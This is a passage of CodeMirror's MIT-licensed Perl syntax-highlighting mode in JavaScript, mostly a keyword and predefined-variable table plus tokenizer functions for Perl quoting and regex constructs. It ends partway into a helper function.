// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

// CodeMirror2 mode/perl/perl.js (text/x-perl) beta 0.10 (2011-11-08)
// This is a part of CodeMirror from https://github.com/sabaca/CodeMirror_mode_perl (mail@sabaca.com)

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("perl",function(){
        // http://perldoc.perl.org
        var PERL={                                      //   null - magic touch
                                                        //   1 - keyword
                                                        //   2 - def
                                                        //   3 - atom
                                                        //   4 - operator
                                                        //   5 - variable-2 (predefined)
                                                        //   [x,y] - x=1,2,3; y=must be defined if x{...}
                                                //      PERL operators
                '->'                            :   4,
                '++'                            :   4,
                '--'                            :   4,
                '**'                            :   4,
                                                        //   ! ~ \ and unary + and -
                '=~'                            :   4,
                '!~'                            :   4,
                '*'                             :   4,
                '/'                             :   4,
                '%'                             :   4,
                'x'                             :   4,
                '+'                             :   4,
                '-'                             :   4,
                '.'                             :   4,
                '<<'                            :   4,
                '>>'                            :   4,
                                                        //   named unary operators
                '<'                             :   4,
                '>'                             :   4,
                '<='                            :   4,
                '>='                            :   4,
                'lt'                            :   4,
                'gt'                            :   4,
                'le'                            :   4,
                'ge'                            :   4,
                '=='                            :   4,
                '!='                            :   4,
                '<=>'                           :   4,
                'eq'                            :   4,
                'ne'                            :   4,
                'cmp'                           :   4,
                '~~'                            :   4,
                '&'                             :   4,
                '|'                             :   4,
                '^'                             :   4,
                '&&'                            :   4,
                '||'                            :   4,
                '//'                            :   4,
                '..'                            :   4,
                '...'                           :   4,
                '?'                             :   4,
                ':'                             :   4,
                '='                             :   4,
                '+='                            :   4,
                '-='                            :   4,
                '*='                            :   4,  //   etc. ???
                ','                             :   4,
                '=>'                            :   4,
                '::'                            :   4,
                                                        //   list operators (rightward)
                'not'                           :   4,
                'and'                           :   4,
                'or'                            :   4,
                'xor'                           :   4,
                                                //      PERL predefined variables (I know, what this is a paranoid idea, but may be needed for people, who learn PERL, and for me as well, ...and may be for you?;)
                'BEGIN'                         :   [5,1],
                'END'                           :   [5,1],
                'PRINT'                         :   [5,1],
                'PRINTF'                        :   [5,1],
                'GETC'                          :   [5,1],
                'READ'                          :   [5,1],
                'READLINE'                      :   [5,1],
                'DESTROY'                       :   [5,1],
                'TIE'                           :   [5,1],
                'TIEHANDLE'                     :   [5,1],
                'UNTIE'                         :   [5,1],
                'STDIN'                         :    5,
                'STDIN_TOP'                     :    5,
                'STDOUT'                        :    5,
                'STDOUT_TOP'                    :    5,
                'STDERR'                        :    5,
                'STDERR_TOP'                    :    5,
                '$ARG'                          :    5,
                '$_'                            :    5,
                '@ARG'                          :    5,
                '@_'                            :    5,
                '$LIST_SEPARATOR'               :    5,
                '$"'                            :    5,
                '$PROCESS_ID'                   :    5,
                '$PID'                          :    5,
                '$$'                            :    5,
                '$REAL_GROUP_ID'                :    5,
                '$GID'                          :    5,
                '$('                            :    5,
                '$EFFECTIVE_GROUP_ID'           :    5,
                '$EGID'                         :    5,
                '$)'                            :    5,
                '$PROGRAM_NAME'                 :    5,
                '$0'                            :    5,
                '$SUBSCRIPT_SEPARATOR'          :    5,
                '$SUBSEP'                       :    5,
                '$;'                            :    5,
                '$REAL_USER_ID'                 :    5,
                '$UID'                          :    5,
                '$<'                            :    5,
                '$EFFECTIVE_USER_ID'            :    5,
                '$EUID'                         :    5,
                '$>'                            :    5,
                '$a'                            :    5,
                '$b'                            :    5,
                '$COMPILING'                    :    5,
                '$^C'                           :    5,
                '$DEBUGGING'                    :    5,
                '$^D'                           :    5,
                '${^ENCODING}'                  :    5,
                '$ENV'                          :    5,
                '%ENV'                          :    5,
                '$SYSTEM_FD_MAX'                :    5,
                '$^F'                           :    5,
                '@F'                            :    5,
                '${^GLOBAL_PHASE}'              :    5,
                '$^H'                           :    5,
                '%^H'                           :    5,
                '@INC'                          :    5,
                '%INC'                          :    5,
                '$INPLACE_EDIT'                 :    5,
                '$^I'                           :    5,
                '$^M'                           :    5,
                '$OSNAME'                       :    5,
                '$^O'                           :    5,
                '${^OPEN}'                      :    5,
                '$PERLDB'                       :    5,
                '$^P'                           :    5,
                '$SIG'                          :    5,
                '%SIG'                          :    5,
                '$BASETIME'                     :    5,
                '$^T'                           :    5,
                '${^TAINT}'                     :    5,
                '${^UNICODE}'                   :    5,
                '${^UTF8CACHE}'                 :    5,
                '${^UTF8LOCALE}'                :    5,
                '$PERL_VERSION'                 :    5,
                '$^V'                           :    5,
                '${^WIN32_SLOPPY_STAT}'         :    5,
                '$EXECUTABLE_NAME'              :    5,
                '$^X'                           :    5,
                '$1'                            :    5, // - regexp $1, $2...
                '$MATCH'                        :    5,
                '$&'                            :    5,
                '${^MATCH}'                     :    5,
                '$PREMATCH'                     :    5,
                '$`'                            :    5,
                '${^PREMATCH}'                  :    5,
                '$POSTMATCH'                    :    5,
                "$'"                            :    5,
                '${^POSTMATCH}'                 :    5,
                '$LAST_PAREN_MATCH'             :    5,
                '$+'                            :    5,
                '$LAST_SUBMATCH_RESULT'         :    5,
                '$^N'                           :    5,
                '@LAST_MATCH_END'               :    5,
                '@+'                            :    5,
                '%LAST_PAREN_MATCH'             :    5,
                '%+'                            :    5,
                '@LAST_MATCH_START'             :    5,
                '@-'                            :    5,
                '%LAST_MATCH_START'             :    5,
                '%-'                            :    5,
                '$LAST_REGEXP_CODE_RESULT'      :    5,
                '$^R'                           :    5,
                '${^RE_DEBUG_FLAGS}'            :    5,
                '${^RE_TRIE_MAXBUF}'            :    5,
                '$ARGV'                         :    5,
                '@ARGV'                         :    5,
                'ARGV'                          :    5,
                'ARGVOUT'                       :    5,
                '$OUTPUT_FIELD_SEPARATOR'       :    5,
                '$OFS'                          :    5,
                '$,'                            :    5,
                '$INPUT_LINE_NUMBER'            :    5,
                '$NR'                           :    5,
                '$.'                            :    5,
                '$INPUT_RECORD_SEPARATOR'       :    5,
                '$RS'                           :    5,
                '$/'                            :    5,
                '$OUTPUT_RECORD_SEPARATOR'      :    5,
                '$ORS'                          :    5,
                '$\\'                           :    5,
                '$OUTPUT_AUTOFLUSH'             :    5,
                '$|'                            :    5,
                '$ACCUMULATOR'                  :    5,
                '$^A'                           :    5,
                '$FORMAT_FORMFEED'              :    5,
                '$^L'                           :    5,
                '$FORMAT_PAGE_NUMBER'           :    5,
                '$%'                            :    5,
                '$FORMAT_LINES_LEFT'            :    5,
                '$-'                            :    5,
                '$FORMAT_LINE_BREAK_CHARACTERS' :    5,
                '$:'                            :    5,
                '$FORMAT_LINES_PER_PAGE'        :    5,
                '$='                            :    5,
                '$FORMAT_TOP_NAME'              :    5,
                '$^'                            :    5,
                '$FORMAT_NAME'                  :    5,
                '$~'                            :    5,
                '${^CHILD_ERROR_NATIVE}'        :    5,
                '$EXTENDED_OS_ERROR'            :    5,
                '$^E'                           :    5,
                '$EXCEPTIONS_BEING_CAUGHT'      :    5,
                '$^S'                           :    5,
                '$WARNING'                      :    5,
                '$^W'                           :    5,
                '${^WARNING_BITS}'              :    5,
                '$OS_ERROR'                     :    5,
                '$ERRNO'                        :    5,
                '$!'                            :    5,
                '%OS_ERROR'                     :    5,
                '%ERRNO'                        :    5,
                '%!'                            :    5,
                '$CHILD_ERROR'                  :    5,
                '$?'                            :    5,
                '$EVAL_ERROR'                   :    5,
                '$@'                            :    5,
                '$OFMT'                         :    5,
                '$#'                            :    5,
                '$*'                            :    5,
                '$ARRAY_BASE'                   :    5,
                '$['                            :    5,
                '$OLD_PERL_VERSION'             :    5,
                '$]'                            :    5,
                                                //      PERL blocks
                'if'                            :[1,1],
                elsif                           :[1,1],
                'else'                          :[1,1],
                'while'                         :[1,1],
                unless                          :[1,1],
                'for'                           :[1,1],
                foreach                         :[1,1],
                                                //      PERL functions
                'abs'                           :1,     // - absolute value function
                accept                          :1,     // - accept an incoming socket connect
                alarm                           :1,     // - schedule a SIGALRM
                'atan2'                         :1,     // - arctangent of Y/X in the range -PI to PI
                bind                            :1,     // - binds an address to a socket
                binmode                         :1,     // - prepare binary files for I/O
                bless                           :1,     // - create an object
                bootstrap                       :1,     //
                'break'                         :1,     // - break out of a "given" block
                caller                          :1,     // - get context of the current subroutine call
                chdir                           :1,     // - change your current working directory
                chmod                           :1,     // - changes the permissions on a list of files
                chomp                           :1,     // - remove a trailing record separator from a string
                chop                            :1,     // - remove the last character from a string
                chown                           :1,     // - change the ownership on a list of files
                chr                             :1,     // - get character this number represents
                chroot                          :1,     // - make directory new root for path lookups
                close                           :1,     // - close file (or pipe or socket) handle
                closedir                        :1,     // - close directory handle
                connect                         :1,     // - connect to a remote socket
                'continue'                      :[1,1], // - optional trailing block in a while or foreach
                'cos'                           :1,     // - cosine function
                crypt                           :1,     // - one-way passwd-style encryption
                dbmclose                        :1,     // - breaks binding on a tied dbm file
                dbmopen                         :1,     // - create binding on a tied dbm file
                'default'                       :1,     //
                defined                         :1,     // - test whether a value, variable, or function is defined
                'delete'                        :1,     // - deletes a value from a hash
                die                             :1,     // - raise an exception or bail out
                'do'                            :1,     // - turn a BLOCK into a TERM
                dump                            :1,     // - create an immediate core dump
                each                            :1,     // - retrieve the next key/value pair from a hash
                endgrent                        :1,     // - be done using group file
                endhostent                      :1,     // - be done using hosts file
                endnetent                       :1,     // - be done using networks file
                endprotoent                     :1,     // - be done using protocols file
                endpwent                        :1,     // - be done using passwd file
                endservent                      :1,     // - be done using services file
                eof                             :1,     // - test a filehandle for its end
                'eval'                          :1,     // - catch exceptions or compile and run code
                'exec'                          :1,     // - abandon this program to run another
                exists                          :1,     // - test whether a hash key is present
                exit                            :1,     // - terminate this program
                'exp'                           :1,     // - raise I to a power
                fcntl                           :1,     // - file control system call
                fileno                          :1,     // - return file descriptor from filehandle
                flock                           :1,     // - lock an entire file with an advisory lock
                fork                            :1,     // - create a new process just like this one
                format                          :1,     // - declare a picture format with use by the write() function
                formline                        :1,     // - internal function used for formats
                getc                            :1,     // - get the next character from the filehandle
                getgrent                        :1,     // - get next group record
                getgrgid                        :1,     // - get group record given group user ID
                getgrnam                        :1,     // - get group record given group name
                gethostbyaddr                   :1,     // - get host record given its address
                gethostbyname                   :1,     // - get host record given name
                gethostent                      :1,     // - get next hosts record
                getlogin                        :1,     // - return who logged in at this tty
                getnetbyaddr                    :1,     // - get network record given its address
                getnetbyname                    :1,     // - get networks record given name
                getnetent                       :1,     // - get next networks record
                getpeername                     :1,     // - find the other end of a socket connection
                getpgrp                         :1,     // - get process group
                getppid                         :1,     // - get parent process ID
                getpriority                     :1,     // - get current nice value
                getprotobyname                  :1,     // - get protocol record given name
                getprotobynumber                :1,     // - get protocol record numeric protocol
                getprotoent                     :1,     // - get next protocols record
                getpwent                        :1,     // - get next passwd record
                getpwnam                        :1,     // - get passwd record given user login name
                getpwuid                        :1,     // - get passwd record given user ID
                getservbyname                   :1,     // - get services record given its name
                getservbyport                   :1,     // - get services record given numeric port
                getservent                      :1,     // - get next services record
                getsockname                     :1,     // - retrieve the sockaddr for a given socket
                getsockopt                      :1,     // - get socket options on a given socket
                given                           :1,     //
                glob                            :1,     // - expand filenames using wildcards
                gmtime                          :1,     // - convert UNIX time into record or string using Greenwich time
                'goto'                          :1,     // - create spaghetti code
                grep                            :1,     // - locate elements in a list test true against a given criterion
                hex                             :1,     // - convert a string to a hexadecimal number
                'import'                        :1,     // - patch a module's namespace into your own
                index                           :1,     // - find a substring within a string
                'int'                           :1,     // - get the integer portion of a number
                ioctl                           :1,     // - system-dependent device control system call
                'join'                          :1,     // - join a list into a string using a separator
                keys                            :1,     // - retrieve list of indices from a hash
                kill                            :1,     // - send a signal to a process or process group
                last                            :1,     // - exit a block prematurely
                lc                              :1,     // - return lower-case version of a string
                lcfirst                         :1,     // - return a string with just the next letter in lower case
                length                          :1,     // - return the number of bytes in a string
                'link'                          :1,     // - create a hard link in the filesytem
                listen                          :1,     // - register your socket as a server
                local                           : 2,    // - create a temporary value for a global variable (dynamic scoping)
                localtime                       :1,     // - convert UNIX time into record or string using local time
                lock                            :1,     // - get a thread lock on a variable, subroutine, or method
                'log'                           :1,     // - retrieve the natural logarithm for a number
                lstat                           :1,     // - stat a symbolic link
                m                               :null,  // - match a string with a regular expression pattern
                map                             :1,     // - apply a change to a list to get back a new list with the changes
                mkdir                           :1,     // - create a directory
                msgctl                          :1,     // - SysV IPC message control operations
                msgget                          :1,     // - get SysV IPC message queue
                msgrcv                          :1,     // - receive a SysV IPC message from a message queue
                msgsnd                          :1,     // - send a SysV IPC message to a message queue
                my                              : 2,    // - declare and assign a local variable (lexical scoping)
                'new'                           :1,     //
                next                            :1,     // - iterate a block prematurely
                no                              :1,     // - unimport some module symbols or semantics at compile time
                oct                             :1,     // - convert a string to an octal number
                open                            :1,     // - open a file, pipe, or descriptor
                opendir                         :1,     // - open a directory
                ord                             :1,     // - find a character's numeric representation
                our                             : 2,    // - declare and assign a package variable (lexical scoping)
                pack                            :1,     // - convert a list into a binary representation
                'package'                       :1,     // - declare a separate global namespace
                pipe                            :1,     // - open a pair of connected filehandles
                pop                             :1,     // - remove the last element from an array and return it
                pos                             :1,     // - find or set the offset for the last/next m//g search
                print                           :1,     // - output a list to a filehandle
                printf                          :1,     // - output a formatted list to a filehandle
                prototype                       :1,     // - get the prototype (if any) of a subroutine
                push                            :1,     // - append one or more elements to an array
                q                               :null,  // - singly quote a string
                qq                              :null,  // - doubly quote a string
                qr                              :null,  // - Compile pattern
                quotemeta                       :null,  // - quote regular expression magic characters
                qw                              :null,  // - quote a list of words
                qx                              :null,  // - backquote quote a string
                rand                            :1,     // - retrieve the next pseudorandom number
                read                            :1,     // - fixed-length buffered input from a filehandle
                readdir                         :1,     // - get a directory from a directory handle
                readline                        :1,     // - fetch a record from a file
                readlink                        :1,     // - determine where a symbolic link is pointing
                readpipe                        :1,     // - execute a system command and collect standard output
                recv                            :1,     // - receive a message over a Socket
                redo                            :1,     // - start this loop iteration over again
                ref                             :1,     // - find out the type of thing being referenced
                rename                          :1,     // - change a filename
                require                         :1,     // - load in external functions from a library at runtime
                reset                           :1,     // - clear all variables of a given name
                'return'                        :1,     // - get out of a function early
                reverse                         :1,     // - flip a string or a list
                rewinddir                       :1,     // - reset directory handle
                rindex                          :1,     // - right-to-left substring search
                rmdir                           :1,     // - remove a directory
                s                               :null,  // - replace a pattern with a string
                say                             :1,     // - print with newline
                scalar                          :1,     // - force a scalar context
                seek                            :1,     // - reposition file pointer for random-access I/O
                seekdir                         :1,     // - reposition directory pointer
                select                          :1,     // - reset default output or do I/O multiplexing
                semctl                          :1,     // - SysV semaphore control operations
                semget                          :1,     // - get set of SysV semaphores
                semop                           :1,     // - SysV semaphore operations
                send                            :1,     // - send a message over a socket
                setgrent                        :1,     // - prepare group file for use
                sethostent                      :1,     // - prepare hosts file for use
                setnetent                       :1,     // - prepare networks file for use
                setpgrp                         :1,     // - set the process group of a process
                setpriority                     :1,     // - set a process's nice value
                setprotoent                     :1,     // - prepare protocols file for use
                setpwent                        :1,     // - prepare passwd file for use
                setservent                      :1,     // - prepare services file for use
                setsockopt                      :1,     // - set some socket options
                shift                           :1,     // - remove the first element of an array, and return it
                shmctl                          :1,     // - SysV shared memory operations
                shmget                          :1,     // - get SysV shared memory segment identifier
                shmread                         :1,     // - read SysV shared memory
                shmwrite                        :1,     // - write SysV shared memory
                shutdown                        :1,     // - close down just half of a socket connection
                'sin'                           :1,     // - return the sine of a number
                sleep                           :1,     // - block for some number of seconds
                socket                          :1,     // - create a socket
                socketpair                      :1,     // - create a pair of sockets
                'sort'                          :1,     // - sort a list of values
                splice                          :1,     // - add or remove elements anywhere in an array
                'split'                         :1,     // - split up a string using a regexp delimiter
                sprintf                         :1,     // - formatted print into a string
                'sqrt'                          :1,     // - square root function
                srand                           :1,     // - seed the random number generator
                stat                            :1,     // - get a file's status information
                state                           :1,     // - declare and assign a state variable (persistent lexical scoping)
                study                           :1,     // - optimize input data for repeated searches
                'sub'                           :1,     // - declare a subroutine, possibly anonymously
                'substr'                        :1,     // - get or alter a portion of a stirng
                symlink                         :1,     // - create a symbolic link to a file
                syscall                         :1,     // - execute an arbitrary system call
                sysopen                         :1,     // - open a file, pipe, or descriptor
                sysread                         :1,     // - fixed-length unbuffered input from a filehandle
                sysseek                         :1,     // - position I/O pointer on handle used with sysread and syswrite
                system                          :1,     // - run a separate program
                syswrite                        :1,     // - fixed-length unbuffered output to a filehandle
                tell                            :1,     // - get current seekpointer on a filehandle
                telldir                         :1,     // - get current seekpointer on a directory handle
                tie                             :1,     // - bind a variable to an object class
                tied                            :1,     // - get a reference to the object underlying a tied variable
                time                            :1,     // - return number of seconds since 1970
                times                           :1,     // - return elapsed time for self and child processes
                tr                              :null,  // - transliterate a string
                truncate                        :1,     // - shorten a file
                uc                              :1,     // - return upper-case version of a string
                ucfirst                         :1,     // - return a string with just the next letter in upper case
                umask                           :1,     // - set file creation mode mask
                undef                           :1,     // - remove a variable or function definition
                unlink                          :1,     // - remove one link to a file
                unpack                          :1,     // - convert binary structure into normal perl variables
                unshift                         :1,     // - prepend more elements to the beginning of a list
                untie                           :1,     // - break a tie binding to a variable
                use                             :1,     // - load in a module at compile time
                utime                           :1,     // - set a file's last access and modify times
                values                          :1,     // - return a list of the values in a hash
                vec                             :1,     // - test or set particular bits in a string
                wait                            :1,     // - wait for any child process to die
                waitpid                         :1,     // - wait for a particular child process to die
                wantarray                       :1,     // - get void vs scalar vs list context of current subroutine call
                warn                            :1,     // - print debugging info
                when                            :1,     //
                write                           :1,     // - print a picture record
                y                               :null}; // - transliterate a string

        var RXstyle="string-2";
        var RXmodifiers=/[goseximacplud]/;              // NOTE: "m", "s", "y" and "tr" need to correct real modifiers for each regexp type

        function tokenChain(stream,state,chain,style,tail){     // NOTE: chain.length > 2 is not working now (it's for s[...][...]geos;)
                state.chain=null;                               //                                                          12   3tail
                state.style=null;
                state.tail=null;
                state.tokenize=function(stream,state){
                        var e=false,c,i=0;
                        while(c=stream.next()){
                                if(c===chain[i]&&!e){
                                        if(chain[++i]!==undefined){
                                                state.chain=chain[i];
                                                state.style=style;
                                                state.tail=tail;}
                                        else if(tail)
                                                stream.eatWhile(tail);
                                        state.tokenize=tokenPerl;
                                        return style;}
                                e=!e&&c=="\\";}
                        return style;};
                return state.tokenize(stream,state);}

        function tokenSOMETHING(stream,state,string){
                state.tokenize=function(stream,state){
                        if(stream.string==string)
                                state.tokenize=tokenPerl;
                        stream.skipToEnd();
                        return "string";};
                return state.tokenize(stream,state);}

        function tokenPerl(stream,state){
                if(stream.eatSpace())
                        return null;
                if(state.chain)
                        return tokenChain(stream,state,state.chain,state.style,state.tail);
                if(stream.match(/^\-?[\d\.]/,false))
                        if(stream.match(/^(\-?(\d*\.\d+(e[+-]?\d+)?|\d+\.\d*)|0x[\da-fA-F]+|0b[01]+|\d+(e[+-]?\d+)?)/))
                                return 'number';
                if(stream.match(/^<<(?=\w)/)){                  // NOTE: <<SOMETHING\n...\nSOMETHING\n
                        stream.eatWhile(/\w/);
                        return tokenSOMETHING(stream,state,stream.current().substr(2));}
                if(stream.sol()&&stream.match(/^\=item(?!\w)/)){// NOTE: \n=item...\n=cut\n
                        return tokenSOMETHING(stream,state,'=cut');}
                var ch=stream.next();
                if(ch=='"'||ch=="'"){                           // NOTE: ' or " or <<'SOMETHING'\n...\nSOMETHING\n or <<"SOMETHING"\n...\nSOMETHING\n
                        if(prefix(stream, 3)=="<<"+ch){
                                var p=stream.pos;
                                stream.eatWhile(/\w/);
                                var n=stream.current().substr(1);
                                if(n&&stream.eat(ch))
                                        return tokenSOMETHING(stream,state,n);
                                stream.pos=p;}
                        return tokenChain(stream,state,[ch],"string");}
                if(ch=="q"){
                        var c=look(stream, -2);
                        if(!(c&&/\w/.test(c))){
                                c=look(stream, 0);
                                if(c=="x"){
                                        c=look(stream, 1);
                                        if(c=="("){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[")"],RXstyle,RXmodifiers);}
                                        if(c=="["){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["]"],RXstyle,RXmodifiers);}
                                        if(c=="{"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["}"],RXstyle,RXmodifiers);}
                                        if(c=="<"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[">"],RXstyle,RXmodifiers);}
                                        if(/[\^'"!~\/]/.test(c)){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[stream.eat(c)],RXstyle,RXmodifiers);}}
                                else if(c=="q"){
                                        c=look(stream, 1);
                                        if(c=="("){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[")"],"string");}
                                        if(c=="["){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["]"],"string");}
                                        if(c=="{"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["}"],"string");}
                                        if(c=="<"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[">"],"string");}
                                        if(/[\^'"!~\/]/.test(c)){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[stream.eat(c)],"string");}}
                                else if(c=="w"){
                                        c=look(stream, 1);
                                        if(c=="("){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[")"],"bracket");}
                                        if(c=="["){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["]"],"bracket");}
                                        if(c=="{"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["}"],"bracket");}
                                        if(c=="<"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[">"],"bracket");}
                                        if(/[\^'"!~\/]/.test(c)){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[stream.eat(c)],"bracket");}}
                                else if(c=="r"){
                                        c=look(stream, 1);
                                        if(c=="("){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[")"],RXstyle,RXmodifiers);}
                                        if(c=="["){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["]"],RXstyle,RXmodifiers);}
                                        if(c=="{"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,["}"],RXstyle,RXmodifiers);}
                                        if(c=="<"){
                                                eatSuffix(stream, 2);
                                                return tokenChain(stream,state,[">"],RXstyle,RXmodifiers);}
                                        if(/[\^'"!~\/]/.test(c)){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[stream.eat(c)],RXstyle,RXmodifiers);}}
                                else if(/[\^'"!~\/(\[{<]/.test(c)){
                                        if(c=="("){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[")"],"string");}
                                        if(c=="["){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,["]"],"string");}
                                        if(c=="{"){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,["}"],"string");}
                                        if(c=="<"){
                                                eatSuffix(stream, 1);
                                                return tokenChain(stream,state,[">"],"string");}
                                        if(/[\^'"!~\/]/.test(c)){
                                                return tokenChain(stream,state,[stream.eat(c)],"string");}}}}
                if(ch=="m"){
                        var c=look(stream, -2);
                        if(!(c&&/\w/.test(c))){
                                c=stream.eat(/[(\[{<\^'"!~\/]/);
                                if(c){
                                        if(/[\^'"!~\/]/.test(c)){
                                                return tokenChain(stream,state,[c],RXstyle,RXmodifiers);}
                                        if(c=="("){
                                                return tokenChain(stream,state,[")"],RXstyle,RXmodifiers);}
                                        if(c=="["){
                                                return tokenChain(stream,state,["]"],RXstyle,RXmodifiers);}
                                        if(c=="{"){
                                                return tokenChain(stream,state,["}"],RXstyle,RXmodifiers);}
                                        if(c=="<"){
                                                return tokenChain(stream,state,[">"],RXstyle,RXmodifiers);}}}}
                if(ch=="s"){
                        var c=/[\/>\]})\w]/.test(look(stream, -2));
                        if(!c){
                                c=stream.eat(/[(\[{<\^'"!~\/]/);
                                if(c){
                                        if(c=="[")
                                                return tokenChain(stream,state,["]","]"],RXstyle,RXmodifiers);
                                        if(c=="{")
                                                return tokenChain(stream,state,["}","}"],RXstyle,RXmodifiers);
                                        if(c=="<")
                                                return tokenChain(stream,state,[">",">"],RXstyle,RXmodifiers);
                                        if(c=="(")
                                                return tokenChain(stream,state,[")",")"],RXstyle,RXmodifiers);
                                        return tokenChain(stream,state,[c,c],RXstyle,RXmodifiers);}}}
                if(ch=="y"){
                        var c=/[\/>\]})\w]/.test(look(stream, -2));
                        if(!c){
                                c=stream.eat(/[(\[{<\^'"!~\/]/);
                                if(c){
                                        if(c=="[")
                                                return tokenChain(stream,state,["]","]"],RXstyle,RXmodifiers);
                                        if(c=="{")
                                                return tokenChain(stream,state,["}","}"],RXstyle,RXmodifiers);
                                        if(c=="<")
                                                return tokenChain(stream,state,[">",">"],RXstyle,RXmodifiers);
                                        if(c=="(")
                                                return tokenChain(stream,state,[")",")"],RXstyle,RXmodifiers);
                                        return tokenChain(stream,state,[c,c],RXstyle,RXmodifiers);}}}
                if(ch=="t"){
                        var c=/[\/>\]})\w]/.test(look(stream, -2));
                        if(!c){
                                c=stream.eat("r");if(c){
                                c=stream.eat(/[(\[{<\^'"!~\/]/);
                                if(c){
                                        if(c=="[")
                                                return tokenChain(stream,state,["]","]"],RXstyle,RXmodifiers);
                                        if(c=="{")
                                                return tokenChain(stream,state,["}","}"],RXstyle,RXmodifiers);
                                        if(c=="<")
                                                return tokenChain(stream,state,[">",">"],RXstyle,RXmodifiers);
                                        if(c=="(")
                                                return tokenChain(stream,state,[")",")"],RXstyle,RXmodifiers);
                                        return tokenChain(stream,state,[c,c],RXstyle,RXmodifiers);}}}}
                if(ch=="`"){
                        return tokenChain(stream,state,[ch],"variable-2");}
                if(ch=="/"){
                        if(!/~\s*$/.test(prefix(stream)))
                                return "operator";
                        else
                                return tokenChain(stream,state,[ch],RXstyle,RXmodifiers);}
                if(ch=="$"){
                        var p=stream.pos;
                        if(stream.eatWhile(/\d/)||stream.eat("{")&&stream.eatWhile(/\d/)&&stream.eat("}"))
                                return "variable-2";
                        else
                                stream.pos=p;}
                if(/[$@%]/.test(ch)){
                        var p=stream.pos;
                        if(stream.eat("^")&&stream.eat(/[A-Z]/)||!/[@$%&]/.test(look(stream, -2))&&stream.eat(/[=|\\\-#?@;:&`~\^!\[\]*'"$+.,\/<>()]/)){
                                var c=stream.current();
                                if(PERL[c])
                                        return "variable-2";}
                        stream.pos=p;}
                if(/[$@%&]/.test(ch)){
                        if(stream.eatWhile(/[\w$\[\]]/)||stream.eat("{")&&stream.eatWhile(/[\w$\[\]]/)&&stream.eat("}")){
                                var c=stream.current();
                                if(PERL[c])
                                        return "variable-2";
                                else
                                        return "variable";}}
                if(ch=="#"){
                        if(look(stream, -2)!="$"){
                                stream.skipToEnd();
                                return "comment";}}
                if(/[:+\-\^*$&%@=<>!?|\/~\.]/.test(ch)){
                        var p=stream.pos;
                        stream.eatWhile(/[:+\-\^*$&%@=<>!?|\/~\.]/);
                        if(PERL[stream.current()])
                                return "operator";
                        else
                                stream.pos=p;}
                if(ch=="_"){
                        if(stream.pos==1){
                                if(suffix(stream, 6)=="_END__"){
                                        return tokenChain(stream,state,['\0'],"comment");}
                                else if(suffix(stream, 7)=="_DATA__"){
                                        return tokenChain(stream,state,['\0'],"variable-2");}
                                else if(suffix(stream, 7)=="_C__"){
                                        return tokenChain(stream,state,['\0'],"string");}}}
                if(/\w/.test(ch)){
                        var p=stream.pos;
                        if(look(stream, -2)=="{"&&(look(stream, 0)=="}"||stream.eatWhile(/\w/)&&look(stream, 0)=="}"))
                                return "string";
                        else
                                stream.pos=p;}
                if(/[A-Z]/.test(ch)){
                        var l=look(stream, -2);
                        var p=stream.pos;
                        stream.eatWhile(/[A-Z_]/);
                        if(/[\da-z]/.test(look(stream, 0))){
                                stream.pos=p;}
                        else{
                                var c=PERL[stream.current()];
                                if(!c)
                                        return "meta";
                                if(c[1])
                                        c=c[0];
                                if(l!=":"){
                                        if(c==1)
                                                return "keyword";
                                        else if(c==2)
                                                return "def";
                                        else if(c==3)
                                                return "atom";
                                        else if(c==4)
                                                return "operator";
                                        else if(c==5)
                                                return "variable-2";
                                        else
                                                return "meta";}
                                else
                                        return "meta";}}
                if(/[a-zA-Z_]/.test(ch)){
                        var l=look(stream, -2);
                        stream.eatWhile(/\w/);
                        var c=PERL[stream.current()];
                        if(!c)
                                return "meta";
                        if(c[1])
                                c=c[0];
                        if(l!=":"){
                                if(c==1)
                                        return "keyword";
                                else if(c==2)
                                        return "def";
                                else if(c==3)
                                        return "atom";
                                else if(c==4)
                                        return "operator";
                                else if(c==5)
                                        return "variable-2";
                                else
                                        return "meta";}
                        else
                                return "meta";}
                return null;}

        return {
            startState: function() {
                return {
                    tokenize: tokenPerl,
                    chain: null,
                    style: null,
                    tail: null
                };
            },
            token: function(stream, state) {
                return (state.tokenize || tokenPerl)(stream, state);
            },
            lineComment: '#'
        };
});

CodeMirror.registerHelper("wordChars", "perl", /[\w$]/);

CodeMirror.defineMIME("text/x-perl", "perl");

// it's like "peek", but need for look-ahead or look-behind if index < 0
function look(stream, c){
  return stream.string.charAt(stream.pos+(c||0));
}

// return a part of prefix of current stream from current position
function prefix(stream, c){
  if(c){
    var x=stream.pos-c;
    return stream.string.substr((x>=0?x:0),c);}
  else{
    return stream.string.substr(0,stream.pos-1);
  }
}

// return a part of suffix of current stream from current position
function suffix(stream, c){
  var y=stream.string.length;
  var x=y-stream.pos+1;
  return stream.string.substr(stream.pos,(c&&c<y?c:x));
}

// eating and vomiting a part of stream from current position
function eatSuffix(stream, c){
